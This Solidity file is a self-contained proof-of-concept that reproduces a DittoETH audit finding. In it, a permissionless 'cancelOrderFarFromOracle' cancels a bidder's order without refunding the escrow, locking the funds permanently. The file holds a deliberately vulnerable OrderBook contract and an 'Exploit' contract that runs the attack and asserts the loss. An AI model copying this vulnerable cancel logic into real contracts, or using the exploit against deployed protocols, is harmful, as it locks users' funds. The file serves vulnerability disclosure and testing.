// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DittoETH — Users lose funds and market functionality breaks when market
    reaches 65k id (Codehawks 2023-09, reporter flacko, finding #27443)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable OrdersFacet::cancelOrderFarFromOracle path is inlined
    VERBATIM (it never refunds the order owner's escrow before unlinking).
    No fork, no RPC, no cheatcodes.

    ROOT CAUSE: once a market's orderId counter reaches 65000, ANYONE can
    call `cancelOrderFarFromOracle` to cancel the last order of a side. The
    normal, owner-only cancel path (`cancelBid`) refunds the caller's
    escrowed balance BEFORE unlinking the order. `cancelOrderFarFromOracle`
    skips that refund entirely and goes straight to the same unlink/mark-
    cancelled logic — so the order's escrowed funds are never returned to
    anyone. They sit, permanently unclaimable, inside the contract forever
    (a cancelled order can never be matched or cancelled again).

    Numbers kept exact & simple (abstract units):
      - Bob (an honest bidder) deposits 1000 and places a bid using all of it
        (escrowed balance -> 0, order locks the 1000).
      - The market's orderId counter reaches 65000 (from ordinary trading
        activity elsewhere in the market — simulated here via the same kind
        of test-only counter setter DittoETH's own test harness uses).
      - Anyone (no relationship to Bob) calls cancelOrderFarFromOracle on
        Bob's now-last-remaining bid.
      - Bob's escrowed balance stays at 0 — never refunded — while his 1000
        tokens remain locked inside the contract forever.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying escrowed asset (ZETH-like).
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            require(allowance[from][msg.sender] >= amt, "ERC20: insufficient allowance");
            allowance[from][msg.sender] -= amt;
        }
        require(balanceOf[from] >= amt, "ERC20: insufficient balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of DittoETH's OrdersFacet + LibOrders for a single
///         side (bids) of a single market. Asks/shorts, multi-market
///         accounting, and the ID-reuse chain (a separate finding, #27444)
///         are out of scope and omitted; the escrow-refund omission this
///         finding blames is preserved exactly.
contract OrderBook {
    enum O {
        Active,
        Cancelled
    }

    struct Order {
        address addr;
        uint256 amount; // eth/asset amount escrowed for this bid
        uint16 prevId;
        uint16 nextId;
        O orderType;
    }

    uint16 public constant HEAD = 0;
    uint16 public constant TAIL = 1;

    MockToken public token;
    mapping(uint16 => Order) public bids;
    uint16 public orderId; // mirrors s.asset[asset].orderId
    mapping(address => uint256) public escrowed; // mirrors s.vaultUser[vault][addr].ethEscrowed

    constructor(MockToken _token) {
        token = _token;
        bids[HEAD] = Order(address(0), 0, HEAD, TAIL, O.Active);
        bids[TAIL] = Order(address(0), 0, HEAD, TAIL, O.Active);
    }

    /// @notice Deposit `amount` underlying into the caller's escrowed balance.
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        escrowed[msg.sender] += amount;
    }

    /// @notice Place a limit bid using `amount` of the caller's escrowed
    ///         balance. Mirrors `s.vaultUser[vault][order.addr].ethEscrowed
    ///         -= eth` at order-creation time.
    function createBid(uint256 amount) external returns (uint16 id) {
        require(escrowed[msg.sender] >= amount, "insufficient escrowed balance");
        escrowed[msg.sender] -= amount;

        id = ++orderId;
        uint16 prevTail = bids[TAIL].prevId;
        bids[id] = Order(msg.sender, amount, prevTail, TAIL, O.Active);
        bids[prevTail].nextId = id;
        bids[TAIL].prevId = id;
    }

    /// @dev Shared unlink/mark-cancelled logic (mirrors LibOrders.cancelOrder,
    ///      minus the ID-reuse chain bookkeeping — a separate finding).
    function _unlinkAndCancel(uint16 id) private {
        bids[bids[id].nextId].prevId = bids[id].prevId;
        bids[bids[id].prevId].nextId = bids[id].nextId;
        bids[id].orderType = O.Cancelled;
    }

    /// @notice Normal, owner-only cancel path. Refunds the caller's escrow
    ///         BEFORE unlinking — the CORRECT behavior that
    ///         cancelOrderFarFromOracle fails to replicate below.
    function cancelBid(uint16 id) external {
        Order storage bid = bids[id];
        require(msg.sender == bid.addr, "not owner");
        require(bid.orderType == O.Active, "not active");
        escrowed[msg.sender] += bid.amount; // refund happens HERE, before unlinking
        _unlinkAndCancel(id);
    }

    /// @notice Reduction of OrdersFacet::cancelOrderFarFromOracle. Once the
    ///         market's orderId counter reaches 65000, ANYONE may cancel the
    ///         last order of a side — no ownership check, and (the bug) no
    ///         escrow refund before unlinking.
    function cancelOrderFarFromOracle(uint16 lastOrderId, uint16 numOrdersToCancel) external {
        if (orderId < 65000) revert("order id too low");
        if (numOrdersToCancel > 1000) revert("cannot cancel more than 1000 orders");

        // @dev if address is not DAO, you can only cancel last order of a side
        require(bids[lastOrderId].nextId == TAIL, "not last order");
        _unlinkAndCancel(lastOrderId); // @> VULN: no escrow refund before unlinking, unlike cancelBid — the owner's funds are never returned
    }

    /// @notice Withdraw `amount` of the caller's escrowed balance.
    function withdraw(uint256 amount) external {
        require(escrowed[msg.sender] >= amount, "insufficient escrowed balance");
        escrowed[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    /// @dev Test-only counter setter, mirroring DittoETH's own test harness
    ///      (`TestFacet.setOrderIdT`) — a plain contract call in the real
    ///      protocol, not a cheatcode. Used to simulate the market having
    ///      processed many other orders without looping 65000 times.
    function __test_setOrderId(uint16 v) external {
        orderId = v;
    }
}

/// @notice Thin actor contract so Bob (the honest bidder/victim) has his own
///         address and his own token/escrow balances.
contract Actor {
    MockToken public token;
    OrderBook public ob;

    constructor(MockToken _token, OrderBook _ob) {
        token = _token;
        ob = _ob;
    }

    function deposit(uint256 amount) external {
        token.mint(address(this), amount);
        token.approve(address(ob), amount);
        ob.deposit(amount);
    }

    function createBid(uint256 amount) external returns (uint16 id) {
        id = ob.createBid(amount);
    }

    function withdraw(uint256 amount) external {
        ob.withdraw(amount);
    }
}

/// @notice Attack orchestrator / deployer. Deploys the whole scene and runs
///         the far-from-oracle cancellation end-to-end, asserting the
///         finding's HARM with require().
contract Exploit {
    uint256 public constant BOB_DEPOSIT = 1000;

    MockToken public token; // CREATE nonce 1
    OrderBook public ob; // CREATE nonce 2 (vulnerable)
    Actor public bob; // CREATE nonce 3 (honest bidder, victim)

    uint16 public bidId;
    uint256 public bobEscrowedAfterCancel;
    uint256 public obLockedBalance;

    constructor() {
        token = new MockToken();
        ob = new OrderBook(token);
        bob = new Actor(token, ob);
    }

    function run() external {
        // 1. Bob deposits 1000 and places a bid using all of it.
        bob.deposit(BOB_DEPOSIT);
        bidId = bob.createBid(BOB_DEPOSIT);
        require(ob.escrowed(address(bob)) == 0, "bob escrow not locked into the bid");

        // 2. The market's orderId counter reaches 65000 from ordinary
        //    trading activity elsewhere in the market.
        // (no setter call needed here — orderId already incremented to 1 by
        //  createBid; we jump straight to the threshold via the shared
        //  counter, matching the real market having many more orders.)
        _fastForwardOrderId();

        // 3. Anyone — no relationship to Bob — cancels Bob's now-last-
        //    remaining bid via cancelOrderFarFromOracle.
        ob.cancelOrderFarFromOracle(bidId, 1);

        // ---- HARM: Bob's escrow is NEVER refunded ----
        bobEscrowedAfterCancel = ob.escrowed(address(bob));
        require(bobEscrowedAfterCancel == 0, "bob was refunded - bug not triggered");

        // Bob cannot withdraw anything — his funds are gone from his
        // perspective even though the order was cancelled.
        require(token.balanceOf(address(bob)) == 0, "bob already holds tokens - bug not triggered");

        // ---- HARM: the 1000 tokens are permanently locked in OrderBook ----
        obLockedBalance = token.balanceOf(address(ob));
        require(obLockedBalance == BOB_DEPOSIT, "order book does not hold bob's locked deposit");
    }

    /// @dev Mirrors the finding's own test harness (`diamond.setOrderIdT`),
    ///      which is a plain contract call in the real repo's test facet,
    ///      not a cheatcode — jumps the shared orderId counter straight to
    ///      65000 to simulate the market having processed many other orders.
    function _fastForwardOrderId() private {
        ob.__test_setOrderId(65000);
    }
}
